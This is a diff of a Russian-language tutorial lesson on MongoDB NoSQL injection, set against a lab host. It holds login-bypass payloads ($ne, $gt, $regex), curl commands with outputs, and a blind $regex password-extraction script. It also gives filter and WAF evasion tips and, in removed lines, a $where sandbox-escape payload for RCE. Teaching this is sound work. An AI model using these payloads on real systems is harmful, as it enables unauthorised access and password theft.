@@ -15,194 +15,110 @@ estimated_minutes: 45
 summary: "NoSQL-инъекции в MongoDB: операторная инъекция ($ne/$gt/$regex), $where/JS, обход логина и извлечение данных."
 ---
 
-NoSQL-инъекция — это инъекция **операторов/структуры** в запрос к не-реляционному хранилищу. Классика — MongoDB: если серверный код передаёт JSON из тела запроса прямо в `find()`/`findOne()` без приведения типов, атакующий подставляет операторы (`$ne`, `$gt`, `$regex`, `$where`) вместо строки и обходит аутентификацию или извлекает данные. Отдельная ветвь — инъекция в JS-движок (`$where`, `mapReduce`, `$function`) вплоть до RCE. Встречается в Node.js/Express, PHP, Python (pymongo) приложениях.
+## Задача
 
-## Теория: как ломается запрос
+Мы нашли в `shop.local` форму входа, которая общается с сервером через JSON, и сервер явно использует MongoDB. Хотим без пароля войти администратором, а если не выйдет — вытянуть пароль посимвольно. В прошлом уроке мы увидели, что `{"$ne":"x"}` сработал; теперь разберём **почему** и какие ещё операторы есть в запасе.
 
-Уязвимый код (Node/Express):
+## Данные, с которыми работаем
+
+Запрос на вход:
+
+```http
+POST /api/login HTTP/1.1
+Host: shop.local
+Content-Type: application/json
+
+{"username":"admin","password":"secret"}
+```
+
+Серверный код (Node.js + Express + драйвер MongoDB):
 
 ```js
-const user = await db.collection('users').findOne({ username: req.body.username, password: req.body.password });
+app.post('/api/login', async (req, res) => {
+  const user = await db.collection('users').findOne({
+    username: req.body.username,
+    password: req.body.password
+  });
+  if (!user) return res.json({ error: 'invalid credentials' });
+  res.json({ ok: true, token: makeToken(user) });
+});
 ```
 
-Ожидается строка, но тело — JSON, поэтому можно прислать объект-оператор:
+`findOne` принимает **фильтр** — JSON-документ вида `{поле: значение}`. Проблема в том, что `req.body.password` берётся из пользовательского JSON и **тип не проверяется**. Значением фильтра может оказаться не строка, а объект — и MongoDB воспримет его как **оператор**.
 
-```json
-{"username": "admin", "password": {"$ne": "x"}}
-```
+## Пробуем в лоб
 
-Запрос станет «password не равен 'x'» — истинно для админа → вход без пароля. То же в URL-encoded: `username=admin&password[$ne]=x`.
-
-## Синтаксис NoSQL-операторов
-
-| Оператор | Значение |
-|----------|----------|
-| `$ne` | не равно |
-| `$eq` | равно |
-| `$gt` / `$lt` | больше/меньше |
-| `$gte` / `$lte` | больше-равно/меньше-равно |
-| `$in` / `$nin` | входит/не входит в список |
-| `$regex` | регулярное выражение |
-| `$exists` | существует ли поле |
-| `$where` | JS-предикат (опасно) |
-| `$or` / `$and` | логические |
-| `$type` | тип поля |
-| `$expr` | агрегатное выражение |
-
-Прототип-загрязнение: `$where`/`$function` + `__proto__` иногда дают загрязнение прототипа (см. `web-prototype-pollution`).
-
-## Вектор 1: обход аутентификации
-
-```json
-{"username":"admin","password":{"$ne":"anything"}}
-{"username":{"$gt":""},"password":{"$gt":""}}
-{"username":"admin","password":{"$regex":".*"}}
-```
-
-URL-encoded форма:
+Первое, что приходит в голову с прошлого урока про SQLi, — кавычка и `OR 1=1`:
 
 ```bash
-curl -s -X POST https://app.example/login \
-  --data-urlencode 'username=admin' --data-urlencode 'password[$ne]=x'
+$ curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' \
+>   -d "{\"username\":\"admin\",\"password\":\"' OR 1=1-- -\"}"
+{"error":"invalid credentials"}
 ```
 
-## Вектор 2: извлечение данных через `$regex`
+Не работает: здесь нет SQL-парсера, `' OR 1=1` — просто текст, которого нет ни у одного пароля. Нужен синтаксис **самого MongoDB**.
 
-Если вывод различается, подбираем пароль/токен посимвольно:
+## Приём: подставляем объект-оператор
 
-```json
-{"username":"admin","password":{"$regex":"^a"}}
-{"username":"admin","password":{"$regex":"^ab"}}
-```
-
-`^` — начало строки; `.` — любой символ; `[...]` — класс. По «успех/неуспех» строим oracle. Для больших алфавитов используйте бинарный поиск через диапазоны (`[a-m]`).
-
-## Вектор 3: `$where` / JS-инъекция
-
-`$where` принимает JavaScript-предикат, исполняемый на сервере БД:
-
-```json
-{"$where":"this.username=='admin' && this.password[0]=='a'"}
-```
-
-Эксплуатация до RCE (если включён серверный JS и есть доступ к `process`/`global`):
-
-```json
-{"$where":"function(){return (function(){var x=this;return true})()}"}
-{"$where":"this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')"}
-```
-
-Последний payload — классический escape из sandbox MongoDB через `constructor.constructor` → RCE. На практике чаще работает как blind-oracle или DoS (тяжёлый JS), а RCE зависит от версии и конфигурации (`--noscripting` выключает).
-
-## Вектор 4: `$ne/$gt/$in` для blind
-
-```json
-{"username":"admin","password":{"$ne":""}}
-{"username":{"$in":["admin","root"]},"password":{"$ne":"x"}}
-{"username":{"$regex":"^a"},"password":{"$ne":"x"}}
-```
-
-Комбинируя `$regex` + `$ne`, можно перечислять пользователей и подбирать пароли без вывода — только по разнице ответов.
-
-## Разобранный пример: обход логина
-
-Шаг 1 — базовый тест:
+В MongoDB `$`-ключи — это операторы сравнения. `$ne` — «не равно» (`not equal`). Пришлём пароль объектом:
 
 ```bash
-curl -s -X POST https://app.example/login -H 'Content-Type: application/json' \
-  --data '{"username":"admin","password":{"$ne":"x"}}' -c cookies.txt
+$ curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' \
+>   -d '{"username":"admin","password":{"$ne":"x"}}'
+{"ok":true,"token":"eyJhbGciOiJIUzI1NiJ9..."}
 ```
 
-Шаг 2 — если вернулась сессия/профиль админа — вход выполнен. Иначе попробуйте `{"$gt":""}` для обоих полей.
+Сервер построил фильтр «пароль не равен `x`». Для реального пароля это истина, поэтому нашёлся документ `admin` — и мы вошли. Обрати внимание: нам **не нужен** правильный пароль, достаточно, чтобы условие оказалось истинным.
 
-Шаг 3 — URL-encoded вариант для form-форм:
+Другие операторы того же семейства:
+
+| Оператор | Смысл | Payload |
+|----------|-------|---------|
+| `$ne` | не равно | `{"$ne":"x"}` |
+| `$gt` | больше | `{"$gt":""}` |
+| `$regex` | регулярное выражение | `{"$regex":"^a"}` |
+| `$in` | входит в список | `{"$in":["admin","root"]}` |
+| `$exists` | поле существует | `{"$exists":true}` |
+| `$where` | JS-предикат (опасно) | `"this.x==1"` |
+
+## Формы доставки: не только JSON
+
+Если форма обычная, а не JSON, скобочная нотация в теле создаёт вложенный объект:
 
 ```bash
-curl -s -X POST https://app.example/login --data-urlencode 'username=admin' --data-urlencode 'password[$ne]=x'
+$ curl -s -X POST https://shop.local/api/login \
+>   --data-urlencode 'username=admin' --data-urlencode 'password[$ne]=x'
+{"ok":true,"token":"eyJ..."}
 ```
 
-## Разобранный пример: blind `$regex` extraction
+`password[$ne]=x` парсер (`qs` в Express, PHP-массивы) превращает в `password: {$ne: "x"}`. То же в query-строке: `?username=admin&password[$ne]=x`. Проверяй все точки входа — тело, query, заголовки, аргументы GraphQL.
+
+## Полный прогон: слепое извлечение пароля через `$regex`
+
+Обход входа — это доступ, но часто хочется узнать сам пароль (или токен). Если сервер отвечает по-разному на «верно/неверно», используем `$regex` как оракул.
+
+Сначала убедимся, что ответы различаются:
+
+```bash
+$ curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' \
+>   -d '{"username":"admin","password":"wrong"}'
+{"error":"invalid credentials"}
+
+$ curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' \
+>   -d '{"username":"admin","password":{"$regex":"^zzz"}}'
+{"error":"invalid credentials"}
+
+$ curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' \
+>   -d '{"username":"admin","password":{"$regex":"^f"}}'
+{"ok":true,"token":"eyJ..."}
+```
+
+`^f` значит «пароль начинается на `f`» — и это верно. Теперь перебираем символ за символом:
 
 ```python
 import requests, string
-url = "https://app.example/login"
-def ok(prefix):
-    r = requests.post(url, json={"username":"admin","password":{"$regex":"^"+prefix}})
-    return "invalid" not in r.text
-pw = ""
-for i in range(0, 60):
-    for c in string.ascii_letters + string.digits + "{}_-":
-        if ok(pw + c):
-            pw += c; break
-    else:
-        break
-print("password:", pw)
-```
-
-Для ускорения — бинарный поиск по диапазону символов в одном запросе.
-
-## CouchDB и другие хранилища
-
-- **CouchDB** — `_config`/`_users` с admin party, инъекция в Mango-селекторы, RCE через `_config`/`os_process`.
-- **Elasticsearch** — script injection (painless) в `_search`, RCE при включённых скриптах.
-- **Redis** — не NoSQL-инъекция, а доступ к командам (см. `web-ssrf-protocol-smuggling`).
-- **Neo4j** — Cypher-инъекция в `MATCH ... WHERE`.
-- **Memcached/InfluxDB** — другие модели, но тот же принцип «недоверенный ввод → запрос».
-
-## Инструменты
-
-- **`curl`** — ручные JSON/URL payload.
-- **Burp Repeater** — быстрый перебор операторов.
-- **`mongosh`/`mongo`** — понимание запросов и локальная проверка.
-- **`nosqlmap`** — автоматизация NoSQL-инъекций.
-- **`ffuf`** — поиск API-эндпоинтов.
-
-## Что дальше / decision
-
-1. Форма/API возвращает JSON или принимает вложенные параметры → проверьте `{"$ne":"x"}`.
-2. Обход сработал → зафиксируйте доступ, попробуйте извлечь данные через `$regex`.
-3. Вывод скрыт → blind `$regex`/`$ne`.
-4. Доступен `$where` → пробуйте JS-escape до RCE (аккуратно, можно уронить БД).
-5. Дальше — эскалация к RCE через `$function`/mapReduce, если серверный JS включён.
-
-## Частые ошибки
-
-- **Путать NoSQL с SQLi.** Операторы другие; `' OR 1=1` не работает.
-- **Не отправить вложенный объект.** В form-формах нужен `password[$ne]=x`.
-- **Сдаваться на строковом парсинге.** Если сервер приводит тип — вектор закрыт, ищите другой.
-- **Ждать вывода.** Используйте boolean-blind.
-- **Уронить БД.** `$where` с тяжёлым JS — DoS; будьте осторожны.
-- **Ломать прод.** Только с согласия.
-
-## Полный разбор: blind $regex extraction с выводом
-
-End-to-end извлечение пароля администратора, когда приложение отвечает разным текстом на верный/неверный запрос.
-
-Шаг 1. Находим oracle: подбираем запрос, где ответ меняется.
-
-```bash
-# неверный пароль
-curl -s -X POST https://app.example/login -H 'Content-Type: application/json' \
-  --data '{"username":"admin","password":"wrong"}' | head -c 60
-# {"error":"invalid credentials"}
-
-# оператор $regex с неверным префиксом
-curl -s -X POST https://app.example/login -H 'Content-Type: application/json' \
-  --data '{"username":"admin","password":{"$regex":"^zzz"}}' | head -c 60
-# {"error":"invalid credentials"}
-
-# с верным префиксом (допустим, пароль начинается на 'f')
-curl -s -X POST https://app.example/login -H 'Content-Type: application/json' \
-  --data '{"username":"admin","password":{"$regex":"^f"}}' | head -c 60
-# {"ok":true,"token":"eyJ..."}
-```
-
-Шаг 2. Автоматизируем посимвольный подбор:
-
-```python
-import requests, string
-URL = "https://app.example/login"
-CHARS = string.ascii_letters + string.digits + "_-{}!@#$"
+URL = "https://shop.local/api/login"
+CHARS = string.ascii_letters + string.digits + "_-{}!@#"
 def match(prefix):
     r = requests.post(URL, json={"username":"admin","password":{"$regex":"^"+prefix}})
     return '"ok":true' in r.text
@@ -216,58 +132,41 @@ while True:
 print("password =", pw)
 ```
 
-Вывод по шагам: `f`, `fl`, `fla`, `flag`, `flag{`, … — пока следующий символ не найдётся (значит, строка кончилась).
+Вывод по шагам:
 
-Шаг 3. Ускоряем бинарным поиском: вместо перебора символов проверяем диапазоны `^flag\{[a-m]` (класс символов), сокращая пространство вдвое за запрос.
+```
+f
+fl
+fla
+flag
+flag{...
+```
 
-## NoSQL в URL и заголовках (не только JSON)
+Цикл идёт, пока находится следующий символ; когда ни один не подошёл — строка кончилась. Для ускорения вместо полного перебора символов берут **бинарный поиск** по диапазонам: проверяют класс `^flag\{[a-m]` и за один запрос отбрасывают половину алфавита.
 
-Операторную инъекцию можно доставить не только JSON-телом:
+## Ветка `$where`: JavaScript на сервере
 
-- **Query string:** `?username=admin&password[$ne]=x` (Express с `qs` парсит скобки).
-- **Form-urlencoded:** `username=admin&password[$regex]=^a`.
-- **JSON с вложенностью:** `{"password":{"$ne":null}}`.
-- **Массив:** `password[]=` (в некоторых драйверах превращается в объект).
-- **Заголовки/cookie:** если приложение строит запрос из cookie (редко).
-- **GraphQL:** аргумент `password: { $ne: "x" }` (если резолвер передаёт объект в Mongo).
+Оператор `$where` принимает **JavaScript-предикат**, который исполняется на сервере базы. Это открывает тайминг-канал (можно спрашивать не только про префикс, но и про любые свойства документа) и в старых/неправильно настроенных инсталляциях — выход из песочницы:
 
-Проверяйте все точки входа: тело, query, заголовки, GraphQL-аргументы.
+```json
+{"$where":"this.username=='admin' && this.password[0]=='a'"}
+```
 
-## Reference-таблица: MongoDB-операторы для атак
+Через `constructor.constructor` в некоторых версиях добираются до `process` и до RCE, но это зависит от версии и от того, включён ли серверный JS (`--noscripting` его выключает). На реальном тесте `$where` чаще полезен как оракул, чем как RCE, — и осторожно: тяжёлый JS может уронить базу.
 
-| Оператор | Payload | Эффект |
-|----------|---------|--------|
-| `$ne` | `{"$ne":"x"}` | обход пароля |
-| `$gt` | `{"$gt":""}` | «больше пустой строки» — истинно |
-| `$regex` | `{"$regex":"^a"}` | посимвольное извлечение |
-| `$in` | `{"$in":["admin","root"]}` | перебор имён |
-| `$exists` | `{"$exists":true}` | поиск документов с полем |
-| `$or` | `{"$or":[{},{}]}` | всегда истинно |
-| `$where` | `"this.x==1"` | JS-предикат (blind/RCE) |
-| `$expr` | `{"$expr":{"$eq":[1,1]}}` | агрегатные выражения |
-| `$function` | JS-тело | RCE (MongoDB 4.4+) |
-| `$type` | `{"$type":2}` | фильтр по типу |
+## Другие хранилища
 
-## Обход защит и фильтров
+Тот же принцип «ввод меняет структуру запроса» работает и за пределами MongoDB:
 
-- **Если `$` фильтруется** — попробуйте URL-кодирование `%24ne`, unicode `\u0024ne`, или вложенность `{"password":{"\u0024ne":"x"}}`.
-- **Если объекты запрещены** — используйте `$where` со строкой, если он разрешён.
-- **Если включён `--noscripting`** — `$where`/`$function` не работают, остаются `$regex`/`$ne`/`$gt`.
-- **WAF по сигнатуре `$ne`** — меняйте оператор на `$gt`, `$gte`, `$nin`.
-- **Типизация входа** (строгая проверка `typeof === 'string'`) закрывает вектор — тогда ищите другие параметры (числовые, массивы).
+- **CouchDB** — Mango-селекторы и админ-интерфейс `_config`/`_users` (при «admin party» — доступ без пароля).
+- **Elasticsearch** — скрипты `painless` в `_search`, при включённом скриптинге вплоть до RCE.
+- **Neo4j** — инъекция в Cypher при конкатенации строк.
 
-## Что делать дальше / решение
+Поэтому SQL-сканеры их и не находят: синтаксис другой. Разбор этих хранилищ — в следующих уроках (`db-mongodb`, `db-redis`, `db-elasticsearch`).
 
-1. **JSON/вложенный ввод** → сразу `{"$ne":"x"}` на пароль.
-2. **Обход сработал** → фиксируем доступ, читаем профиль/данные.
-3. **Вывод скрыт** → blind `$regex` с `^prefix` (автоматизируем скриптом).
-4. **Доступен `$where`/`$function`** → пробуем JS-escape до RCE (аккуратно — можно уронить БД).
-5. **Строгая типизация** → ищем другие точки (числовые поля, `$in`-фильтры, GraphQL).
-6. Далее — зафиксировать креды/токены и записать артефакт.
+## Почему это работает не только в Node.js
 
-## Типизация входа: почему PHP/Python-драйверы тоже уязвимы
-
-MongoDB-драйверы принимают запрос как ассоциативный массив/словарь. Если код берёт значение из пользовательского ввода и **не проверяет тип**, массив превращается в объект-оператор. Пример на PHP:
+MongoDB-драйверы на любом языке принимают фильтр как словарь/ассоциативный массив. Если код кладёт туда значение из запроса без проверки типа, пришедший массив превращается в объект-оператор. Пример на PHP:
 
 ```php
 $user = $collection->findOne([
@@ -276,56 +175,61 @@ $user = $collection->findOne([
 ]);
 ```
 
-Запрос `username[$ne]=x&password[$ne]=x` даст `['$ne' => 'x']` в обоих полях → вход. В Python (pymongo) аналогично: `db.users.find_one({"username": request.json["username"]})`, где `username` — словарь `{"$ne": None}`.
+Запрос `username[$ne]=x&password[$ne]=x` даст `['$ne' => 'x']` в оба поля — вход без пароля. В Python (pymongo) то же самое: `db.users.find_one({"username": request.json["username"]})`, где `username` — словарь `{"$ne": None}`. Лечится это одной строкой: `if (!is_string($username)) reject;`. Поэтому всегда проверяй, приводит ли сервер тип, прежде чем отбрасывать NoSQL-инъекцию.
 
-Лечится строгой типизацией: `if (!is_string($username)) reject;` или приведением `(string)$username`. Без этого любой не-строковый JSON-тип (объект, массив, `$`-ключ) становится вектором. Всегда проверяйте, приводит ли сервер тип входа, прежде чем отбрасывать NoSQL-инъекцию.
+## Если не сработало
 
-## Elasticsearch и CouchDB: инъекция в другие хранилища
+- **Сервер приводит тип** (`typeof === 'string'`) — объект отбрасывается, вектор закрыт для этого параметра; ищи другие точки (числовые поля, `$in`-фильтры, GraphQL).
+- **Фильтруются `$`-ключи** — попробуй URL-кодирование `%24ne` или unicode `\u0024ne`.
+- **WAF по сигнатуре `$ne`** — смени оператор на `$gt`, `$gte`, `$nin`.
+- **Включён `--noscripting`** — `$where`/`$function` не работают, остаются `$regex`/`$ne`/`$gt`.
 
-Помимо MongoDB, операторная инъекция встречается в других NoSQL:
+## Что мы теперь знаем
 
-- **Elasticsearch:** скрипты в `_search` (`script_fields`, `painless`). Если серверный скриптинг включён, можно вычислять значения и, при слабой изоляции, достигать RCE. Payload — `{"script_fields":{"x":{"script":{"lang":"painless","source":"..."}}}}`.
-- **CouchDB:** Mango-селекторы (`{"selector":{...}}`) и админ-интерфейс `_config`/`_users`; при «admin party» доступ без пароля, а `_config` позволяет менять настройки и добиться RCE через `os_process`.
-- **Neo4j:** Cypher-инъекция в `MATCH (u:User {name:$name})` при конкатенации строк — аналог SQLi.
-- **Redis:** не операторная инъекция, а прямой доступ к командам (см. SSRF/gopher).
-
-Общий принцип один: пользовательский ввод, попадая в структуру запроса без типизации, меняет логику выборки. Ищите не только Mongo, но и все хранилища, к которым приложение строит запросы из ввода.
+- NoSQL-инъекция — это подстановка **оператора/структуры** вместо значения, когда сервер не проверяет тип ввода.
+- `{"$ne":"x"}` даёт обход входа: условие истинно для любого пароля.
+- Оператор можно доставить через JSON, form-urlencoded (`password[$ne]=x`) или query.
+- `$regex` с `^prefix` — оракул для посимвольного извлечения (blind).
+- `$where` исполняет JS на сервере БД: тайминг-канал и, иногда, RCE.
+- Защита: строгая типизация входа, запрет `$`-ключей, отключение серверного скриптинга.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Как обойти MongoDB-логин через оператор?"
   options:
-    - "password: ' OR 1=1--"
-    - 'password: {"$ne":"x"}'
-    - "password: null"
-    - "password: 123"
+    - "`password: ' OR 1=1-- -`"
+    - '`password: {"$ne":"x"}`'
+    - "`password: null`"
+    - "`password: 123`"
   answer: 1
-  explanation: "Объект-оператор меняет логику findOne."
+  explanation: "Объект-оператор `$ne` меняет логику `findOne`."
 - question: "Какой оператор используют для посимвольного извлечения?"
   options:
-    - "LIKE"
-    - "$regex"
-    - "MATCH"
-    - "="
+    - "`LIKE`"
+    - "`$regex`"
+    - "`MATCH`"
+    - "`=`"
   answer: 1
-  explanation: "Регулярка с ^prefix даёт бинарный сигнал."
+  explanation: "Регулярка `^prefix` даёт бинарный ответ верно/неверно."
 - question: "Как передать оператор в form-urlencoded?"
   options:
-    - "password=$ne"
-    - "password[$ne]=x"
-    - "password.ne=x"
-    - "password:ne"
+    - "`password=$ne`"
+    - "`password[$ne]=x`"
+    - "`password.ne=x`"
+    - "`password:ne`"
   answer: 1
   explanation: "Скобочная нотация создаёт вложенный объект."
-- question: "Что опасно в $where?"
+- question: "Что опасно в `$where`?"
   options:
     - "Он медленный"
-    - "Выполняет JavaScript на сервере БД (тайминг/инъекция)"
-    - "Он шифрует"
-    - "Он кеширует"
+    - "Исполняет JavaScript на сервере БД — тайминг-канал и возможный RCE"
+    - "Он шифрует данные"
+    - "Он кеширует ответы"
   answer: 1
-  explanation: "JS-контекст даёт тайминг-канал и больше."
+  explanation: "JS-контекст расширяет возможности за пределы сравнения строк."
 - question: "Почему SQL-сканеры не находят NoSQL-инъекции?"
   options:
     - "Они медленные"
@@ -333,12 +237,16 @@ $user = $collection->findOne([
     - "Нет TLS"
     - "Нет ошибок"
   answer: 1
-  explanation: "NoSQL-операторы не совпадают с SQL-сигнатурами."
+  explanation: "Операторы MongoDB не совпадают с SQL-сигнатурами."
 ```
+
+## Куда дальше
+
+Мы научились обходить MongoDB-логин и тянуть данные через `$regex`. В следующем уроке `web-nosql-dbms` мы построим карту: как по баннеру и отклику отличить MongoDB от Redis, Elasticsearch и CouchDB — и почему у каждого хранилища свой, иногда куда более прямой путь до RCE. А пока главное запомни: если сервер не проверяет тип ввода, объект с `$`-оператором становится частью запроса.
 
 ## Где пригодится
 
-- **CTF (Web):** задачи с JSON-логином/поиском.
+- **CTF (Web):** задачи с JSON-логином и поиском — обход через `$ne`/`$regex` встречается постоянно.
 - **Bug bounty:** обход аутентификации через тип-конфузию — критичный отчёт.
-- **Пентест:** аудит приложений на MongoDB/CouchDB.
+- **Пентест:** аудит приложений на MongoDB/CouchDB/Elasticsearch.
 - **Работа (AppSec):** типизация входа, запрет операторов в пользовательских данных, отключение `$where`.
